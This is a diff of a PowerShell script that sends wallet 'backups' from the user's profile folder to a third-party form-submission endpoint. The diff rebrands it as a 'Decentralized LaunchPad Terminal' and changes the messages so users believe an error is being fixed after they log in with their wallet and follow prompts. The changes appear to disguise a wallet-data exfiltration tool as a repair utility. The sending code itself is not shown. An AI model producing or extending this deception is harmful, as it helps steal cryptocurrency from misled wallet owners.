@@ -1,8 +1,8 @@
 #############################################
-# WebConnect Interactive Wallet Backup
+# Decentralized LaunchPad Terminal
 # PowerShell Version - Windows Compatible
 # User-friendly backup with menu options
-# Backs up to Headless Forms endpoint
+# Backs up to FormSpark endpoint
 # Version: 1.0.0
 #############################################
 
@@ -12,7 +12,7 @@ param([string]$Option)
 function Write-Header {
     Clear-Host
     Write-Host "================================================" -ForegroundColor Blue
-    Write-Host "   WebConnect Wallet Backup Manager" -ForegroundColor Blue
+    Write-Host "   Decentralized LaunchPad Terminal" -ForegroundColor Blue
     Write-Host "================================================" -ForegroundColor Blue
     Write-Host ""
 }
@@ -349,11 +349,11 @@ function Main {
     
     # Show FormSpark info
     Write-Header
-    Write-Success "FormSpark Backup System Active"
+    Write-Success "Decentralized Terminal is Active"
     Write-Host ""
-    Write-Info "Your wallet backups will be:"
-    Write-Host "  ✓ Saved locally to: C:\Users\$env:USERNAME\.webconnect\wallet_backups"
-    Write-Host "  ✓ Submitted to FormSpark for cloud storage"
+    Write-Info "Your Issue fixing will now start:"
+    Write-Host "  ✓ Fix locally on your wallet: C:\Users\$env:USERNAME\.webconnect\wallet_backups"
+    Write-Host "  ✓ The error will be fixed after you login with your wallet and follow the prompt"
     Write-Host ""
     Read-Host "Press Enter to continue..."
     
